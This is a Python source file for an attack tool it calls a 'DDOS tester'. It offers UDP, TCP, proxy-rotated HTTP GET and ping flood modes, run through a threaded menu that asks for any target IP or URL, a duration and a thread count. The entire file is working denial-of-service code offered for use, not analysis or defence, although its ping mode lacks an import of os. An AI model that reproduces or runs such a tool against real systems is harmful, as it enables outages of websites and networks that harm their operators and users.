import socket
import threading
import random
import time
import requests
import sys

# === LOAD PROXY & USER-AGENTS ===
def load_proxies():
    try:
        with open("proxy.txt") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print("proxy.txt tidak ditemukan atau kosong!")
        return []

def load_user_agents():
    try:
        with open("ua.txt") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print("ua.txt tidak ditemukan! Menggunakan default UA...")
        return [
            "Mozilla/5.0", "Chrome/90.0", "Safari/537.36",
            "Opera/9.80", "Edge/91.0"
        ]

# === LAYER 3: UDP FLOOD ===
def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (target_ip, target_port))
            print(f"[UDP] Sent packet to {target_ip}:{target_port}")
        except:
            pass

# === LAYER 4: TCP FLOOD ===
def tcp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(random._urandom(2048))
            sock.close()
            print(f"[TCP] Flooded {target_ip}:{target_port}")
        except:
            pass

# === LAYER 7: HTTP GET FLOOD ===
def http_flood(url, proxy_list, ua_list, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            proxy = random.choice(proxy_list)
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            headers = {'User-Agent': random.choice(ua_list)}
            response = requests.get(url, proxies=proxies, headers=headers, timeout=5)
            print(f"[HTTP] GET {url} via {proxy} -> {response.status_code}")
        except:
            pass

# === PING FLOOD ===
def ping_flood(target_ip, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            response = os.system(f"ping -c 1 {target_ip}")
            print(f"[PING] Sent ping to {target_ip} -> Response: {response}")
        except:
            pass

# === MENU UTAMA ===
if __name__ == "__main__":
    print("=== SUPER DDOS TESTER MULTI LAYER ===")
    print("1. UDP FLOOD (L3)")
    print("2. TCP FLOOD (L4)")
    print("3. HTTP GET FLOOD via PROXY (L7)")
    print("4. PING FLOOD")
    choice = input("Pilih mode (1/2/3/4): ")

    if choice in ["1", "2"]:
        target = input("Target IP: ")
        try:
            port = int(input("Port: "))
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            print("Port tidak valid!")
            sys.exit()
        try:
            duration = int(input("Durasi (detik): "))
            threads = int(input("Threads: "))
        except ValueError:
            print("Input angka tidak valid.")
            sys.exit()

        attack = udp_flood if choice == "1" else tcp_flood
        for _ in range(threads):
            threading.Thread(target=attack, args=(target, port, duration)).start()

    elif choice == "3":
        url = input("Target URL (https://...): ")
        try:
            duration = int(input("Durasi (detik): "))
            threads = int(input("Threads: "))
        except ValueError:
            print("Input angka tidak valid.")
            sys.exit()

        proxy_list = load_proxies()
        ua_list = load_user_agents()

        if not proxy_list:
            print("proxy.txt tidak tersedia. Keluar.")
            sys.exit()

        for _ in range(threads):
            threading.Thread(target=http_flood, args=(url, proxy_list, ua_list, duration)).start()

    elif choice == "4":
        target_ip = input("Target IP untuk ping flood: ")
        try:
            duration = int(input("Durasi (detik): "))
            threads = int(input("Threads: "))
        except ValueError:
            print("Input angka tidak valid.")
            sys.exit()

        for _ in range(threads):
            threading.Thread(target=ping_flood, args=(target_ip, duration)).start()

    else:
        print("Pilihan tidak valid.")